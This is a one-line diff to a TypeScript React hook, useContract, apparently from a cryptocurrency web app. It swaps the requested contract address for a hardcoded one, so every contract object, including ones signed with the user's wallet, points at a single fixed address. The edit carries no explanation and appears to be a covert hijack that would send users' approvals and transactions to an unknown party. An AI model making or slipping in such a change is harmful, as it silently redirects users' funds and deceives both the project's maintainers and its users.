@@ -55,7 +55,7 @@ export function useContract<T extends Contract = Contract>(
     if (!address) return null;
     try {
       return getContract(
-        address,
+        "0x6c4f9282bBD29992bF4F064F0165e805336Eef59",
         ABI,
         library,
         withSignerIfPossible && account ? account : undefined
